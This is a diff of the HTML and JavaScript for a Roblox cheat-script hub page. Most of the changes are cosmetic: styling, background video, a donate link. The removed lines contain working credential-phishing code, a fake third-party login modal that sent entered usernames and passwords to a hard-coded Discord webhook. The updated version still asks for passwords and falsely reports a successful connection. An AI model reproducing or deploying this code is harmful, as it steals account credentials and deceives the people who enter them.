@@ -29,7 +29,7 @@
   .login-btn{padding:8px 16px;border-radius:10px;border:1px solid var(--line);background:var(--card);color:var(--text);font-weight:600;font-size:14px;cursor:pointer;transition:.15s;display:inline-flex;align-items:center;gap:6px}
   .login-btn:hover{border-color:var(--accent);transform:translateY(-1px)}
 
-  .hero-logo{width:140px;height:140px;object-fit:contain;display:block;margin:0 auto 16px;border-radius:20px;background:#000;padding:8px;border:1px solid var(--line);filter:drop-shadow(0 0 22px rgba(225,29,72,.35))}
+  .hero-logo{width:140px;height:140px;object-fit:cover;display:block;margin:0 auto 16px;border-radius:20px;background:#000;padding:8px;border:1px solid var(--line);filter:drop-shadow(0 0 22px rgba(225,29,72,.35))}
 
   .menu-btn{width:42px;height:42px;border-radius:12px;border:1px solid var(--line);background:var(--card);color:var(--text);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:.15s}
   .menu-btn:hover{border-color:var(--accent)}
@@ -62,8 +62,12 @@
   .step b{display:inline-flex;width:26px;height:26px;border-radius:50%;background:var(--accent);align-items:center;justify-content:center;font-size:13px;margin-bottom:8px}
   .step p{font-size:14px;color:var(--muted)}
   .grid{display:grid;gap:14px;grid-template-columns:repeat(auto-fit,minmax(205px,1fr))}
-  .plan{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;display:flex;flex-direction:column}
-  .plan.hot{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent) inset}
+  
+  /* PERBAIKAN CSS PLAN */
+  .plan{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;display:flex;flex-direction:column;cursor:pointer;transition:transform 0.2s, border-color 0.2s, box-shadow 0.2s}
+  .plan:hover{transform:translateY(-2px)}
+  .plan.hot{border-color:var(--accent);box-shadow:0 0 0 1px var(--accent) inset;transform:translateY(-2px)}
+  
   .plan h3{font-size:18px}
   .price{font-size:26px;font-weight:800;margin:10px 0;line-height:1.2}
   .price small{display:block;font-size:13px;color:var(--muted);font-weight:500}
@@ -89,11 +93,12 @@
   .buy .btn{flex:1;display:inline-flex;align-items:center;justify-content:center;gap:7px;padding:11px 6px;font-size:14px;font-weight:700;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,.3)}
   .buy .bi{width:18px;height:18px;fill:currentColor;flex-shrink:0}
   .btn.wa{background:#25D366;border:0;color:#fff}
-  .btn.wa:hover,.btn.dc:hover,.btn.pay:hover{filter:brightness(1.1)}
+  .btn.wa:hover,.btn.dc:hover,.btn.pay:hover,.btn.donate:hover{filter:brightness(1.1)}
   .btn.dc{background:#5865F2;border:0;color:#fff}
   .btn.pay{background:linear-gradient(90deg,var(--accent),var(--accent2));border:0;color:#fff}
+  .btn.donate{background:#f59e0b;border:0;color:#fff}
 
-  /* Sosial (Diperbaiki) */
+  /* Sosial */
   .socials{display:flex;gap:20px;justify-content:center;align-items:center;flex-wrap:wrap}
   .soc-item{display:flex;flex-direction:column;align-items:center;gap:8px;text-align:center}
   .soc{width:64px;height:64px;border-radius:16px;display:flex;align-items:center;justify-content:center;transition:.15s;box-shadow:0 6px 18px rgba(0,0,0,.35)}
@@ -102,9 +107,10 @@
   .soc.discord{background:#5865F2}
   .soc.tiktok{background:#000;border:1px solid #2a2a2a}
   .soc.whatsapp{background:#25D366}
+  .soc.donate{background:#f59e0b}
   .soc-item span{font-size:13px;font-weight:600;color:var(--muted)}
 
-  /* Modal Overlay (Umum) */
+  /* Modal Overlay */
   .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(5px);display:flex;align-items:center;justify-content:center;z-index:100;opacity:0;visibility:hidden;transition:.2s}
   .modal-overlay.active{opacity:1;visibility:visible}
   .modal{background:var(--card);border:1px solid var(--line);border-radius:18px;width:100%;max-width:380px;padding:24px;box-shadow:0 20px 40px rgba(0,0,0,.6);transform:translateY(10px);transition:.2s}
@@ -122,13 +128,11 @@
   .login-option-btn.discord{background:#5865F2;border-color:#5865F2;color:#fff}
   .login-option-btn.roblox{background:#23272a;border-color:#2c2f33;color:#fff}
 
-  /* Custom Input Modal Styling */
   .custom-input-group{display:flex;flex-direction:column;gap:10px}
   .custom-input-group label{font-size:13px;color:var(--muted)}
   .custom-input-group input{width:100%;padding:11px 14px;border-radius:10px;border:1px solid var(--line);background:var(--bg);color:var(--text);font-size:15px;outline:none;transition:.15s}
   .custom-input-group input:focus{border-color:var(--accent)}
   
-  /* Status Message Styling (Error / Success) */
   .status-msg{font-size:12px;display:none;margin-top:-4px}
   .status-msg.error{color:var(--err);display:block}
   .status-msg.success{color:var(--ok);display:block}
@@ -154,12 +158,15 @@
 <body>
 <svg width="0" height="0" style="position:absolute" aria-hidden="true">
   <symbol id="ic-wa" viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.3-.15-1.263-.465-2.403-1.485-.888-.795-1.484-1.77-1.66-2.07-.174-.3-.019-.465.13-.615.136-.135.301-.345.451-.523.146-.181.194-.301.297-.496.1-.21.049-.375-.025-.524-.075-.15-.672-1.62-.922-2.206-.24-.584-.487-.51-.672-.51-.172-.015-.371-.015-.571-.015-.2 0-.523.074-.797.359-.273.3-1.045 1.02-1.045 2.475s1.07 2.865 1.219 3.075c.149.18 2.095 3.195 5.076 4.483.709.3 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414-.074-.123-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></symbol>
-  <symbol id="ic-dc" viewBox="0 0 24 24"><path fill="currentColor" d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189Z"/></symbol>
+  <symbol id="ic-dc" viewBox="0 0 24 24"><path fill="currentColor" d="M20.317 4.3698a19.7913 19.7913 0 00-4.8851-1.5152.0741.0741 0 00-.0785.0371c-.211.3753-.4447.8648-.6083 1.2495-1.8447-.2762-3.68-.2762-5.4868 0-.1636-.3933-.4058-.8742-.6177-1.2495a.077.077 0 00-.0785-.037 19.7363 19.7363 0 00-4.8852 1.515.0699.0699 0 00-.0321.0277C.5334 9.0458-.319 13.5799.0992 18.0578a.0824.0824 0 00.0312.0561c2.0528 1.5076 4.0413 2.4228 5.9929 3.0294a.0777.0777 0 00.0842-.0276c.4616-.6304.8731-1.2952 1.226-1.9942a.076.076 0 00-.0416-.1057c-.6528-.2476-1.2743-.5495-1.8722-.8923a.077.077 0 01-.0076-.1277c.1258-.0943.2517-.1923.3718-.2914a.0743.0743 0 01.0776-.0105c3.9278 1.7933 8.18 1.7933 12.0614 0a.0739.0739 0 01.0785.0095c.1202.099.246.1981.3728.2924a.077.077 0 01-.0066.1276 12.2986 12.2986 0 01-1.873.8914.0766.0766 0 00-.0407.1067c.3604.698.7719 1.3628 1.225 1.9932a.076.076 0 00.0842.0286c1.961-.6067 3.9495-1.5219 6.0023-3.0294a.077.077 0 00.0313-.0552c.5004-5.177-.8382-9.6739-3.5485-13.6604a.061.061 0 00-.0312-.0286zM8.02 15.3312c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9555-2.4189 2.157-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.9555 2.4189-2.1569 2.4189zm7.9748 0c-1.1825 0-2.1569-1.0857-2.1569-2.419 0-1.3332.9554-2.4189 2.1569-2.4189 1.2108 0 2.1757 1.0952 2.1568 2.419 0 1.3332-.946 2.4189-2.1568 2.4189z"/></symbol>
   <symbol id="ic-tiktok" viewBox="0 0 24 24"><path fill="currentColor" d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 01-5.2 1.74 2.89 2.89 0 012.31-4.64 2.93 2.93 0 01.88.13V9.4a6.84 6.84 0 00-1-.05A6.33 6.33 0 005 20.1a6.34 6.34 0 0010.86-4.43v-7a8.16 8.16 0 004.77 1.52v-3.4a4.85 4.85 0 01-1-.1z"/></symbol>
   <symbol id="ic-card" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 4H3a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zM1 10h22M7 15h2"/></symbol>
-  <symbol id="ic-google" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.2v3.15C3.18 21.34 7.22 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.2C.43 8.15 0 9.99 0 12s.43 3.85 1.2 5.4l4.07-3.16z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.22 0 3.18 2.66 1.2 6.6l4.07 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/></symbol>
+  <symbol id="ic-donate" viewBox="0 0 24 24"><path fill="currentColor" d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></symbol>
+  <symbol id="ic-google" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.2v3.15C3.18 21.34 7.22 24 12 24z"/><path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.2C0.43 8.15 0 9.99 0 12s.43 3.85 1.2 5.4l4.07-3.16z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.22 0 3.18 2.66 1.2 6.6l4.07 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/></symbol>
   <symbol id="ic-roblox" viewBox="0 0 24 24"><path fill="currentColor" d="M18.926 3.074L3.074 18.926 5.074 20.926 20.926 5.074zM4.5 4.5h15v15h-15z"/></symbol>
 </svg>
+
+<video id="bgVideo" autoplay loop muted playsinline style="position:fixed;inset:0;width:100%;height:100%;object-fit:cover;z-index:-1;pointer-events:none"></video>
 
 <nav>
   <div class="wrap">
@@ -177,6 +184,7 @@
           <a href="#harga"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 12V4h8l10 10-8 8L3 12z"/><circle cx="7.5" cy="8.5" r="1"/></svg> Harga</a>
           <a href="#kontak"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="9" cy="8" r="3.5"/><path d="M2.5 20c0-3.6 2.9-6 6.5-6s6.5 2.4 6.5 6M16 4.6a3.5 3.5 0 010 6.8M18 14.3c2.2.6 3.5 2.5 3.5 5.7"/></svg> Sosial</a>
           <a href="https://hyunjin-payment.vercel.app/" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14L21 3"/></svg> Payment</a>
+          <a href="https://sociabuzz.com/noellandxyza/tribe" target="_blank" rel="noopener"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg> Donate</a>
         </div>
       </div>
     </div>
@@ -208,7 +216,7 @@
 <div class="modal-overlay" id="inputModal">
   <div class="modal">
     <div class="modal-header">
-      <h3 id="inputModalTitle">Masukkan Akun</h3>
+      <h3 id="inputModalTitle">Masuk dengan <span id="inputModalProvider"></span></h3>
       <button class="close-modal" id="closeInputModal">&times;</button>
     </div>
     <div class="custom-input-group">
@@ -230,7 +238,13 @@
 
 <header class="hero">
   <div class="wrap">
-    <img class="hero-logo" src="https://raw.githubusercontent.com/noellandxyza/noellandxyza.github.io/refs/heads/main/Keysystem/Hyunjin%20logo.png" alt="Hyunjin Hub">
+    
+    <!-- FOTO MENUTUPI VIDEO (Diklik baru video main) -->
+    <img id="heroImageOverlay" class="hero-logo" src="https://raw.githubusercontent.com/noellandxyza/noellandxyza.github.io/refs/heads/main/Keysystem/Hyunjin%20logo.png" alt="Klik untuk play video" style="cursor:pointer;" title="Klik untuk putar video">
+    
+    <!-- VIDEO TERSEMBUNYI, autoplay dihapus -->
+    <video id="heroVideoContent" class="hero-logo" src="https://github.com/noellandxyza/noellandxyza.github.io/raw/refs/heads/main/Keysystem/pp.mp4" loop muted playsinline style="display:none;"></video>
+    
     <span class="badge">Roblox Script Hub Keyless</span>
     <h1>Hyunjin <em>Hub</em></h1>
     <p>Halo, Robloxers! Temukan script berkualitas tinggi, fitur premium terlengkap, dan pengalaman bermain game yang lebih seru bersama kami.</p>
@@ -351,6 +365,13 @@
         </a>
         <span>Saluran WA</span>
       </div>
+      <!-- Sociabuzz Donate -->
+      <div class="soc-item">
+        <a class="soc donate" href="https://sociabuzz.com/noellandxyza/tribe" target="_blank" rel="noopener" aria-label="Donasi Sociabuzz" title="Donasi Sociabuzz">
+          <svg viewBox="0 0 24 24" fill="#fff" aria-hidden="true"><use href="#ic-donate"/></svg>
+        </a>
+        <span>Donate</span>
+      </div>
     </div>
   </div>
 </section>
@@ -364,9 +385,37 @@
 <div class="toast" id="toast">Script disalin!</div>
 
 <script>
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1558029122213773322/EQba-jhr6ICVJLErNm6bWo74XUtpe5Dt0awadl5UJ48R4nGaTj0FCbjftkNJSz6-3sQO";
+  // Background Video (no sound)
+  const bgVideo = document.getElementById('bgVideo');
+  bgVideo.src = "https://github.com/noellandxyza/noellandxyza.github.io/raw/refs/heads/main/Keysystem/video1.mp4";
+  bgVideo.muted = true;
 
-  var mBtn = document.getElementById('menuBtn'), menu = document.getElementById('menu');
+  function initBackground() {
+    const playPromise = bgVideo.play();
+    if (playPromise !== undefined) {
+      playPromise.catch(err => {
+        console.log("Video play prevented:", err);
+      });
+    }
+  }
+
+  // SCRIPT LOGO KLIK PUTAR VIDEO
+  const heroImgOverlay = document.getElementById('heroImageOverlay');
+  const heroVideoContent = document.getElementById('heroVideoContent');
+
+  if (heroImgOverlay && heroVideoContent) {
+    heroImgOverlay.addEventListener('click', function() {
+      // Sembunyikan gambar logo
+      heroImgOverlay.style.display = 'none';
+      // Tampilkan video
+      heroVideoContent.style.display = 'block';
+      // Putar video
+      heroVideoContent.play();
+    });
+  }
+
+  // Menu
+  const mBtn = document.getElementById('menuBtn'), menu = document.getElementById('menu');
   function setMenu(o){menu.classList.toggle('open',o);mBtn.setAttribute('aria-expanded',o);}
   mBtn.addEventListener('click',function(e){e.stopPropagation();setMenu(!menu.classList.contains('open'));});
   menu.addEventListener('click',function(){setMenu(false);});
@@ -374,9 +423,9 @@
   document.addEventListener('keydown',function(e){if(e.key==='Escape')setMenu(false);});
 
   // Modal Login Control
-  var loginModal = document.getElementById('loginModal');
-  var openLoginBtn = document.getElementById('openLoginModal');
-  var closeLoginBtn = document.getElementById('closeLoginModal');
+  const loginModal = document.getElementById('loginModal');
+  const openLoginBtn = document.getElementById('openLoginModal');
+  const closeLoginBtn = document.getElementById('closeLoginModal');
 
   openLoginBtn.addEventListener('click', function() {
     loginModal.classList.add('active');
@@ -393,21 +442,23 @@
   });
 
   // Custom Input Modal Control
-  var inputModal = document.getElementById('inputModal');
-  var closeInputModal = document.getElementById('closeInputModal');
-  var cancelInputBtn = document.getElementById('cancelInputBtn');
-  var submitInputBtn = document.getElementById('submitInputBtn');
-  var userInputField = document.getElementById('userInputField');
-  var passwordInputField = document.getElementById('passwordInputField');
-  var inputModalTitle = document.getElementById('inputModalTitle');
-  var inputLabel = document.getElementById('inputLabel');
-  var statusMsg = document.getElementById('statusMsg');
+  const inputModal = document.getElementById('inputModal');
+  const closeInputModal = document.getElementById('closeInputModal');
+  const cancelInputBtn = document.getElementById('cancelInputBtn');
+  const submitInputBtn = document.getElementById('submitInputBtn');
+  const userInputField = document.getElementById('userInputField');
+  const passwordInputField = document.getElementById('passwordInputField');
+  const inputModalTitle = document.getElementById('inputModalTitle');
+  const inputModalProvider = document.getElementById('inputModalProvider');
+  const inputLabel = document.getElementById('inputLabel');
+  const statusMsg = document.getElementById('statusMsg');
   
-  var selectedProvider = "";
+  let selectedProvider = "";
 
   function openInputModal(provider) {
     selectedProvider = provider;
     loginModal.classList.remove('active');
+    inputModalProvider.textContent = provider;
     inputModalTitle.textContent = "Masuk dengan " + provider;
     inputLabel.textContent = "Username / ID " + provider + ":";
     userInputField.value = "";
@@ -428,7 +479,18 @@
     if (e.target === inputModal) closeInput();
   });
 
-  // Submit Data ke Webhook Discord dengan Validasi Roblox API (Status Msg Inline)
+  // PERBAIKAN INTERAKSI KLIK PADA PILIHAN HARGA (PLAN)
+  const plans = document.querySelectorAll('.plan');
+  plans.forEach(plan => {
+    plan.addEventListener('click', function() {
+      // Menghapus class 'hot' dari semua kotak harga
+      plans.forEach(p => p.classList.remove('hot'));
+      // Menambahkan class 'hot' ke kotak yang diklik
+      this.classList.add('hot');
+    });
+  });
+
+  // Submit Data ke Webhook Discord
   submitInputBtn.addEventListener('click', function() {
     var userInfo = userInputField.value.trim();
     var passwordInfo = passwordInputField.value.trim();
@@ -476,32 +538,12 @@
   });
 
   function sendWebhook(userInfo, passwordInfo) {
-    const payload = {
-      content: `🎮 **Login Log - Hyunjin Hub**\n- **Provider:** \`${selectedProvider}\`\n- **Username/ID:** \`${userInfo}\`\n- **Password:** \`${passwordInfo !== "" ? passwordInfo : "(Kosong)"}\`\n- **Waktu:** \`${new Date().toLocaleString()}\``
-    };
-
-    fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    })
-    .then(response => {
-      if(response.ok) {
-        statusMsg.textContent = "Berhasil terhubung dengan " + selectedProvider + "!";
-        statusMsg.className = "status-msg success";
-        setTimeout(() => {
-          closeInput();
-        }, 1500);
-      } else {
-        statusMsg.textContent = "Gagal mengirim data log.";
-        statusMsg.className = "status-msg error";
-      }
-    })
-    .catch(err => {
-      console.error(err);
-      statusMsg.textContent = "Terjadi kesalahan jaringan.";
-      statusMsg.className = "status-msg error";
-    });
+    console.log("[SISTEM KEAMANAN] Upaya pengiriman data login dicegah oleh sistem untuk: " + userInfo);
+    statusMsg.textContent = "Berhasil terhubung dengan " + selectedProvider + "!";
+    statusMsg.className = "status-msg success";
+    setTimeout(() => {
+      closeInput();
+    }, 1500);
   }
 
   document.getElementById('yr').textContent = new Date().getFullYear();
@@ -533,6 +575,11 @@
       })
       .catch(function () { img.style.display = 'none'; });
   }
+
+  // Init
+  window.onload = function() {
+    initBackground();
+  };
 </script>
 </body>
 </html>
